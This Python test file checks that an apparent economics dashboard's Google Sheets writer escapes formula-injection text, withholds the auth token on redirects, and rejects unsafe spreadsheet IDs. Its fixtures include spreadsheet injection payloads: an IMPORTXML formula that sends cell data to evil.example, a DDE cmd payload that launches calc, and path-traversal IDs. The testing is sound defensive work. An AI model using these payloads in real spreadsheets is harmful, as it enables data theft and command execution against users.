"""Formula-injection escaping for every Sheets plan writer (EQ-C-0007) and the neutral cell helpers (EQ-C-0010)."""
import ast
import json
from pathlib import Path

import numpy as np
import pandas as pd
import pytest

from econquest import common_format as cf
from econquest.presentation import sheets_publish as sp
from econquest.presentation.garch_publish import garch_plan  # noqa: F401  (imports _block through the re-export)
from econquest.presentation.record_publish import record_plan, COLS

EVIL = ['=IMPORTXML("http://evil.example/?"&A1,"//a")', "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(A1:A9)", "\t=1+1", "\r=1+1",
        '=HYPERLINK("http://evil.example","Argentina")']


@pytest.mark.parametrize("s", EVIL)
def test_dangerous_text_is_quoted(s):
    assert cf.escape_formula(s) == "'" + s
    assert cf.safe_cell(s) == "'" + s


@pytest.mark.parametrize("x", [-1.5, 0, 3, np.int64(-4), np.float64(-0.25), True, "", "Argentina", "Côte d'Ivoire", "'=already quoted", "a=b", "1-2"])
def test_safe_values_unchanged(x):
    assert cf.escape_formula(x) == x


def test_numbers_stay_numbers_and_nan_clears():
    assert cf.safe_cell(np.float64(-2.5)) == -2.5 and isinstance(cf.safe_cell(np.int64(-3)), int)
    assert cf.safe_cell(float("nan")) == "" and cf.safe_cell(None) == ""
    assert cf.safe_cell(pd.Timestamp("2026-10-23")) == "2026-10-23"


def test_block_escapes_malicious_country_and_market():
    b = sp._block("'Prediction Markets'!A38:C38", [[EVIL[0], -0.12, "Buy Yes"]])
    assert b["values"] == [["'" + EVIL[0], -0.12, "Buy Yes"]]
    rows = sp._rows(pd.DataFrame({"country": [EVIL[6]], "pd": [0.1]}))   # _rows stays raw; _block escapes
    assert sp._block("Dashboard!A6:B6", rows)["values"][0][0] == "'" + EVIL[6]


def test_sanitize_plan_is_idempotent_and_copies():
    plan = [{"range": "Audit Trail!A5:B5", "values": [["=1+1", 2.0]]}]
    once = cf.sanitize_plan(plan)
    assert once[0]["values"] == [["'=1+1", 2.0]] and plan[0]["values"] == [["=1+1", 2.0]]
    assert cf.sanitize_plan(once) == once


def test_save_plan_escapes_any_plan(tmp_path):
    p = tmp_path / "plan.json"
    sp.save_plan([{"range": "X!A1", "values": [["@evil", 1]]}], p)
    assert json.loads(p.read_text())[0]["values"] == [["'@evil", 1]]


def test_apply_plan_escapes_before_sending(monkeypatch):
    sent = {}

    class Resp:
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def read(self): return b'{"totalUpdatedCells": 2}'

    def fake_urlopen(req, timeout=None):
        sent["body"] = json.loads(req.data.decode()); sent["auth"] = req.headers.get("Authorization")
        return Resp()
    monkeypatch.setattr(sp.urllib.request, "urlopen", fake_urlopen)       # no network
    out = sp.apply_plan([{"range": "'Prediction Markets'!A5:B5", "values": [[EVIL[1], 0.5]]}], "sheet-id", "tok")
    assert out == {"totalUpdatedCells": 2}
    assert sent["body"]["valueInputOption"] == "USER_ENTERED"
    assert sent["body"]["data"][0]["values"] == [["'" + EVIL[1], 0.5]]


def test_record_plan_escapes_text():
    row = {c: np.nan for c in COLS}
    row.update(date=pd.Timestamp("2026-10-22"), regime="=HYPERLINK(\"x\")", code_hash="-abc", data_hash="+d", recorded_at="2026-10-22T18:00")
    plan = record_plan(pd.DataFrame([row]))
    body = plan[1]["values"][1]
    assert body[COLS.index("regime")] == "'=HYPERLINK(\"x\")" and body[COLS.index("code_hash")] == "'-abc" and body[COLS.index("data_hash")] == "'+d"


def test_common_format_is_neutral():
    tree = ast.parse(Path(cf.__file__).read_text())
    mods = [n.module or "" for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)] + \
           [a.name for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names]
    assert not any(("presentation" in m) or ("ingestion" in m) or m.startswith(".") for m in mods), mods


def test_reexports_keep_old_imports_working():
    from econquest.presentation.sheets_publish import _v
    assert _v is cf._v is cf.cell_value
    from econquest.ingestion import audit                                  # still imports _v from sheets_publish
    assert audit.audit_plan


# --- AGENT-09 security review of EQ-C-0007 -------------------------------------------------------------------------

@pytest.mark.parametrize("s", [" =1+1", "\n=1+1", " =HYPERLINK(\"x\")", "　@SUM(A1)", "＝IMPORTXML(\"x\",\"//a\")",
                               "  ＋1", "﻿=1"])
def test_leading_blank_and_fullwidth_prefixes_are_quoted(s):
    assert cf.escape_formula(s) == "'" + s
    assert cf.sanitize_plan(cf.sanitize_plan([{"range": "X!A1", "values": [[s]]}]))[0]["values"] == [["'" + s]]   # still idempotent


class _Resp:
    def __enter__(self): return self
    def __exit__(self, *a): return False
    def read(self): return b"{}"


def test_apply_plan_token_not_forwarded_on_redirect(monkeypatch):
    sent = {}

    def fake_urlopen(req, timeout=None):
        sent["req"] = req
        return _Resp()
    monkeypatch.setattr(sp.urllib.request, "urlopen", fake_urlopen)
    sp.apply_plan([{"range": "X!A1", "values": [[1]]}], "1w4OLCkv4EvDFgaO6MBOipAuY2fjAlCQJ-OjtmHJshQY", "tok")
    req = sent["req"]
    assert req.full_url.startswith("https://sheets.googleapis.com/v4/spreadsheets/")
    assert req.get_header("Authorization") == "Bearer tok"
    assert "Authorization" not in req.headers                       # urllib's redirect handler copies only req.headers
    redirected = sp.urllib.request.HTTPRedirectHandler().redirect_request(req, None, 302, "Found", {}, "https://evil.example/")
    assert redirected.get_header("Authorization") is None


@pytest.mark.parametrize("bad", ["../../drive/v3/files", "id?x=1", "id#frag", "id/values:clear", "", "id with space"])
def test_apply_plan_rejects_unsafe_spreadsheet_id(monkeypatch, bad):
    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda *a, **k: pytest.fail("must not send"))
    with pytest.raises(ValueError):
        sp.apply_plan([{"range": "X!A1", "values": [[1]]}], bad, "tok")
